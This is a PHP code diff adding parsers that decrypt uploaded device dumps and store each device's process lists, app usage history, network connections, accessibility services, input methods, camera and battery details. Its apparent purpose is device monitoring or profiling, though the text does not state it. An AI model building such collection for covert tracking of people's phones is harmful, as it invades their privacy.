@@ -1044,4 +1044,439 @@ class Mod_Parse_Advanced extends Model
         }
     }
 
+    /**
+     * ProcInfoExtractor → tbl_proc_info
+     * File category: proc_info
+     * Stores /proc/* snapshot: meminfo, cpuinfo, stat, version, uptime, net interfaces, net connections
+     */
+    public function parse_proc_info(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
+    {
+        try {
+            $cryptModel = new Mod_Crypt();
+            $dated      = date('Y-m-d H:i:s');
+
+            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
+            if ($raw === false) {
+                log_message('error', '[parse_proc_info] Cannot read file: ' . $file_name);
+                return false;
+            }
+
+            $decoded = $cryptModel->decode_content($raw);
+            if ($decoded === false) {
+                log_message('error', '[parse_proc_info] Decryption failed for: ' . $file_name);
+                return false;
+            }
+
+            $json = json_decode($decoded, true);
+            if ($json === null) {
+                log_message('error', '[parse_proc_info] JSON decode failed: ' . json_last_error_msg());
+                return false;
+            }
+
+            $extracted_at = $json['extracted_at'] ?? null;
+
+            // Avoid duplicate snapshot for same device+timestamp
+            $exists = $this->db->table('tbl_proc_info')
+                ->where('device_id', $device_id)
+                ->where('extracted_at', $extracted_at)
+                ->countAllResults() > 0;
+
+            if ($exists) {
+                log_message('info', '[parse_proc_info] Duplicate snapshot skipped for device: ' . $device_id);
+                return true;
+            }
+
+            $data = [
+                'owner_id'                => $owner_id,
+                'device_id'               => $device_id,
+                'meminfo_json'            => json_encode($json['meminfo'] ?? []),
+                'cpuinfo_json'            => json_encode($json['cpuinfo'] ?? []),
+                'stat_json'               => json_encode($json['stat'] ?? []),
+                'version'                 => $json['version'] ?? null,
+                'uptime_json'             => json_encode($json['uptime'] ?? []),
+                'net_interfaces_json'     => json_encode($json['net_interfaces'] ?? []),
+                'net_connections_json'    => json_encode($json['net_connections'] ?? []),
+                'extracted_at'            => $extracted_at,
+                'created_at'              => $dated,
+                'updated_at'              => $dated,
+            ];
+
+            $this->db->table('tbl_proc_info')->insert($data);
+            log_message('info', '[parse_proc_info] Inserted proc snapshot for device: ' . $device_id);
+            return true;
+
+        } catch (\Exception $e) {
+            log_message('error', '[parse_proc_info] Exception: ' . $e->getMessage());
+            return false;
+        }
+    }
+
+    /**
+     * ProcessExtractor → tbl_running_processes + tbl_running_services
+     * File category: processes
+     * Stores running app processes and services with usage stats
+     */
+    public function parse_processes(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
+    {
+        try {
+            $cryptModel = new Mod_Crypt();
+            $dated      = date('Y-m-d H:i:s');
+
+            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
+            if ($raw === false) return false;
+
+            $decoded = $cryptModel->decode_content($raw);
+            if ($decoded === false) return false;
+
+            $json = json_decode($decoded, true);
+            if ($json === null) return false;
+
+            $extracted_at = $json['extracted_at'] ?? null;
+
+            // Avoid duplicate
+            $exists = $this->db->table('tbl_running_processes')
+                ->where('device_id', $device_id)
+                ->where('extracted_at', $extracted_at)
+                ->countAllResults() > 0;
+            if ($exists) return true;
+
+            // Main process table
+            $this->db->table('tbl_running_processes')->insert([
+                'owner_id'     => $owner_id,
+                'device_id'    => $device_id,
+                'extracted_at' => $extracted_at,
+                'created_at'   => $dated,
+            ]);
+            $procId = $this->db->insertID();
+
+            // Processes
+            $processes = $json['processes'] ?? [];
+            if (!empty($processes) && $procId > 0) {
+                $batch = [];
+                foreach ($processes as $p) {
+                    $batch[] = [
+                        'running_processes_id' => $procId,
+                        'owner_id'             => $owner_id,
+                        'pid'                  => $p['pid'] ?? null,
+                        'process_name'         => $p['process_name'] ?? null,
+                        'uid'                  => $p['uid'] ?? null,
+                        'importance'           => $p['importance'] ?? null,
+                        'importance_reason_code' => $p['importance_reason_code'] ?? null,
+                        'pkg_list_json'        => json_encode($p['pkg_list'] ?? []),
+                        'lru'                  => $p['lru'] ?? null,
+                        'created_at'           => $dated,
+                    ];
+                }
+                $this->db->table('tbl_running_process_details')->insertBatch($batch);
+            }
+
+            // Services
+            $services = $json['services'] ?? [];
+            if (!empty($services) && $procId > 0) {
+                $batch = [];
+                foreach ($services as $s) {
+                    $batch[] = [
+                        'running_process_id'    => $procId,
+                        'owner_id'             => $owner_id,
+                        'pid'                  => $s['pid'] ?? null,
+                        'process'              => $s['process'] ?? null,
+                        'client_package'       => $s['client_package'] ?? null,
+                        'service_class'        => $s['service_class'] ?? null,
+                        'service_package'      => $s['service_package'] ?? null,
+                        'active_since'         => $s['active_since'] ?? null,
+                        'crash_count'          => $s['crash_count'] ?? null,
+                        'flags'                => $s['flags'] ?? null,
+                        'started'              => isset($s['started']) ? ($s['started'] ? 1 : 0) : null,
+                        'created_at'           => $dated,
+                    ];
+                }
+                $this->db->table('tbl_running_services')->insertBatch($batch);
+            }
+
+            // Usage stats (24h)
+            $usage = $json['usage_stats_24h'] ?? [];
+            if (!empty($usage) && is_array($usage) && $procId > 0) {
+                $batch = [];
+                foreach ($usage as $u) {
+                    $batch[] = [
+                        'running_processes_id' => $procId,
+                        'owner_id'             => $owner_id,
+                        'package_name'         => $u['package_name'] ?? null,
+                        'total_time_foreground' => $u['total_time_in_foreground'] ?? null,
+                        'last_time_used'       => $u['last_time_used'] ?? null,
+                        'last_time_service_used' => $u['last_time_service_used'] ?? null,
+                        'last_time_visible'    => $u['last_time_visible'] ?? null,
+                        'app_launch_count'     => $u['app_launch_count'] ?? null,
+                        'created_at'           => $dated,
+                    ];
+                }
+                $this->db->table('tbl_usage_stats_24h')->insertBatch($batch);
+            }
+
+            log_message('info', '[parse_processes] Inserted processes for device: ' . $device_id);
+            return true;
+
+        } catch (\Exception $e) {
+            log_message('error', '[parse_processes] Exception: ' . $e->getMessage());
+            return false;
+        }
+    }
+
+    /**
+     * CameraInfoExtractor → tbl_camera_info
+     * File category: camera_info
+     * Stores camera characteristics per camera ID
+     */
+    public function parse_camera_info(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
+    {
+        try {
+            $cryptModel = new Mod_Crypt();
+            $dated      = date('Y-m-d H:i:s');
+
+            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
+            if ($raw === false) return false;
+
+            $decoded = $cryptModel->decode_content($raw);
+            if ($decoded === false) return false;
+
+            $json = json_decode($decoded, true);
+            if ($json === null) return false;
+
+            $extracted_at = $json['extracted_at'] ?? null;
+            $cameras      = $json['cameras'] ?? [];
+
+            // Avoid duplicate
+            $exists = $this->db->table('tbl_camera_info')
+                ->where('device_id', $device_id)
+                ->where('extracted_at', $extracted_at)
+                ->countAllResults() > 0;
+            if ($exists) return true;
+
+            foreach ($cameras as $cam) {
+                $this->db->table('tbl_camera_info')->insert([
+                    'owner_id'              => $owner_id,
+                    'device_id'             => $device_id,
+                    'camera_id'             => $cam['camera_id'] ?? null,
+                    'lens_facing'           => $cam['lens_facing'] ?? null,
+                    'sensor_orientation'    => $cam['sensor_orientation'] ?? null,
+                    'pixel_array_width'     => $cam['pixel_array_width'] ?? null,
+                    'pixel_array_height'    => $cam['pixel_array_height'] ?? null,
+                    'physical_width_mm'     => $cam['physical_width_mm'] ?? null,
+                    'physical_height_mm'    => $cam['physical_height_mm'] ?? null,
+                    'available_focal_lengths' => json_encode($cam['available_focal_lengths'] ?? []),
+                    'flash_available'       => isset($cam['flash_available']) ? ($cam['flash_available'] ? 1 : 0) : null,
+                    'available_effects' => json_encode($cam['available_effects'] ?? []),
+                    'available_scene_modes' => json_encode($cam['available_scene_modes'] ?? []),
+                    'available_video_stabilization' => json_encode($cam['available_video_stabilization'] ?? []),
+                    'available_ae_modes' => json_encode($cam['available_ae_modes'] ?? []),
+                    'available_af_modes' => json_encode($cam['available_af_modes'] ?? []),
+                    'max_jpeg_width'        => $cam['max_jpeg_width'] ?? null,
+                    'max_jpeg_height'       => $cam['max_jpeg_height'] ?? null,
+                    'extracted_at'          => $extracted_at,
+                    'created_at'            => $dated,
+                    'updated_at'            => $dated,
+                ]);
+            }
+
+            log_message('info', '[parse_camera_info] Inserted ' . count($cameras) . ' cameras for device: ' . $device_id);
+            return true;
+
+        } catch (\Exception $e) {
+            log_message('error', '[parse_camera_info] Exception: ' . $e->getMessage());
+            return false;
+        }
+    }
+
+    /**
+     * BatteryStatsExtractor → tbl_battery_stats
+     * File category: battery_stats
+     * Stores detailed battery counters and health
+     */
+    public function parse_battery_stats(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
+    {
+        try {
+            $cryptModel = new Mod_Crypt();
+            $dated      = date('Y-m-d H:i:s');
+
+            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
+            if ($raw === false) return false;
+
+            $decoded = $cryptModel->decode_content($raw);
+            if ($decoded === false) return false;
+
+            $json = json_decode($decoded, true);
+            if ($json === null) return false;
+
+            $extracted_at = $json['extracted_at'] ?? null;
+
+            // Avoid duplicate
+            $exists = $this->db->table('tbl_battery_stats')
+                ->where('device_id', $device_id)
+                ->where('extracted_at', $extracted_at)
+                ->countAllResults() > 0;
+            if ($exists) return true;
+
+            $this->db->table('tbl_battery_stats')->insert([
+                'owner_id'              => $owner_id,
+                'device_id'             => $device_id,
+                'level_percent'         => $json['level_percent'] ?? null,
+                'is_charging'           => isset($json['is_charging']) ? ($json['is_charging'] ? 1 : 0) : null,
+                'status'                => $json['status'] ?? null,
+                'health'                => $json['health'] ?? null,
+                'temperature_celsius'   => $json['temperature_celsius'] ?? null,
+                'voltage_mv'            => $json['voltage_mv'] ?? null,
+                'plugged_type'          => $json['plugged_type'] ?? null,
+                'technology'            => $json['technology'] ?? null,
+                'capacity_percent'      => $json['capacity_percent'] ?? null,
+                'charge_counter_uah'    => $json['charge_counter_uah'] ?? null,
+                'current_now_ua'        => $json['current_now_ua'] ?? null,
+                'energy_counter_uwh'    => $json['energy_counter_uwh'] ?? null,
+                'status_int'            => $json['status_int'] ?? null,
+                'health_int'            => $json['health_int'] ?? null,
+                'temperature_deci_c'    => $json['temperature_deci_c'] ?? null,
+                'extracted_at'          => $extracted_at,
+                'created_at'            => $dated,
+                'updated_at'            => $dated,
+            ]);
+
+            log_message('info', '[parse_battery_stats] Inserted battery stats for device: ' . $device_id);
+            return true;
+
+        } catch (\Exception $e) {
+            log_message('error', '[parse_battery_stats] Exception: ' . $e->getMessage());
+            return false;
+        }
+    }
+
+    /**
+     * AccessibilityExtractor → tbl_accessibility_services
+     * File category: accessibility
+     * Stores enabled accessibility services
+     */
+    public function parse_accessibility(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
+    {
+        try {
+            $cryptModel = new Mod_Crypt();
+            $dated      = date('Y-m-d H:i:s');
+
+            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
+            if ($raw === false) return false;
+
+            $decoded = $cryptModel->decode_content($raw);
+            if ($decoded === false) return false;
+
+            $json = json_decode($decoded, true);
+            if ($json === null) return false;
+
+            $extracted_at = $json['extracted_at'] ?? null;
+            $services     = $json['services'] ?? [];
+
+            // Avoid duplicate
+            $exists = $this->db->table('tbl_accessibility_services')
+                ->where('device_id', $device_id)
+                ->where('extracted_at', $extracted_at)
+                ->countAllResults() > 0;
+            if ($exists) return true;
+
+            foreach ($services as $svc) {
+                $this->db->table('tbl_accessibility_services')->insert([
+                    'owner_id'                    => $owner_id,
+                    'device_id'                   => $device_id,
+                    'service_id'                  => $svc['id'] ?? null,
+                    'package_name'                => $svc['package_name'] ?? null,
+                    'description'                 => $svc['description'] ?? null,
+                    'capabilities'                => $svc['capabilities'] ?? null,
+                    'flags'                       => $svc['flags'] ?? null,
+                    'notification_timeout'        => $svc['notification_timeout'] ?? null,
+                    'settings_activity_name'      => $svc['settings_activity_name'] ?? null,
+                    'can_retrieve_window_content' => isset($svc['can_retrieve_window_content']) ? ($svc['can_retrieve_window_content'] ? 1 : 0) : null,
+                    'extracted_at'                => $extracted_at,
+                    'created_at'                  => $dated,
+                ]);
+            }
+
+            log_message('info', '[parse_accessibility] Inserted ' . count($services) . ' a11y services for device: ' . $device_id);
+            return true;
+
+        } catch (\Exception $e) {
+            log_message('error', '[parse_accessibility] Exception: ' . $e->getMessage());
+            return false;
+        }
+    }
+
+    /**
+     * InputMethodExtractor → tbl_input_methods + tbl_input_method_subtypes
+     * File category: input_methods
+     * Stores enabled IMEs and their subtypes
+     */
+    public function parse_input_methods(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
+    {
+        try {
+            $cryptModel = new Mod_Crypt();
+            $dated      = date('Y-m-d H:i:s');
+
+            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
+            if ($raw === false) return false;
+
+            $decoded = $cryptModel->decode_content($raw);
+            if ($decoded === false) return false;
+
+            $json = json_decode($decoded, true);
+            if ($json === null) return false;
+
+            $extracted_at = $json['extracted_at'] ?? null;
+            $imes         = $json['input_methods'] ?? [];
+
+            // Avoid duplicate
+            $exists = $this->db->table('tbl_input_methods')
+                ->where('device_id', $device_id)
+                ->where('extracted_at', $extracted_at)
+                ->countAllResults() > 0;
+            if ($exists) return true;
+
+            foreach ($imes as $ime) {
+                $this->db->table('tbl_input_methods')->insert([
+                    'owner_id'     => $owner_id,
+                    'device_id'    => $device_id,
+                    'ime_id'       => $ime['id'] ?? null,
+                    'package_name' => $ime['package_name'] ?? null,
+                    'label'        => $ime['label'] ?? null,
+                    'service_name' => $ime['service_name'] ?? null,
+                    'is_system'    => isset($ime['is_system']) ? ($ime['is_system'] ? 1 : 0) : 0,
+                    'is_auxiliary' => isset($ime['is_auxiliary']) ? ($ime['is_auxiliary'] ? 1 : 0) : 0,
+                    'extracted_at' => $extracted_at,
+                    'created_at'   => $dated,
+                ]);
+                $imeId = $this->db->insertID();
+
+                // Subtypes
+                $subtypes = $ime['subtypes'] ?? [];
+                if (!empty($subtypes) && $imeId > 0) {
+                    $batch = [];
+                    foreach ($subtypes as $st) {
+                        $batch[] = [
+                            'input_method_id'                    => $imeId,
+                            'owner_id'                           => $owner_id,
+                            'locale'                             => $st['locale'] ?? null,
+                            'mode'                               => $st['mode'] ?? null,
+                            'name'                               => $st['name'] ?? null,
+                            'is_ascii_capable'                   => isset($st['is_ascii_capable']) ? ($st['is_ascii_capable'] ? 1 : 0) : 0,
+                            'is_auxiliary'                       => isset($st['is_auxiliary']) ? ($st['is_auxiliary'] ? 1 : 0) : 0,
+                            'overrides_implicitly_enabled_subtype' => isset($st['overrides_implicitly_enabled_subtype']) ? ($st['overrides_implicitly_enabled_subtype'] ? 1 : 0) : 0,
+                            'created_at'                         => $dated,
+                        ];
+                    }
+                    $this->db->table('tbl_input_method_subtypes')->insertBatch($batch);
+                }
+            }
+
+            log_message('info', '[parse_input_methods] Inserted ' . count($imes) . ' IMEs for device: ' . $device_id);
+            return true;
+
+        } catch (\Exception $e) {
+            log_message('error', '[parse_input_methods] Exception: ' . $e->getMessage());
+            return false;
+        }
+    }
+
 }
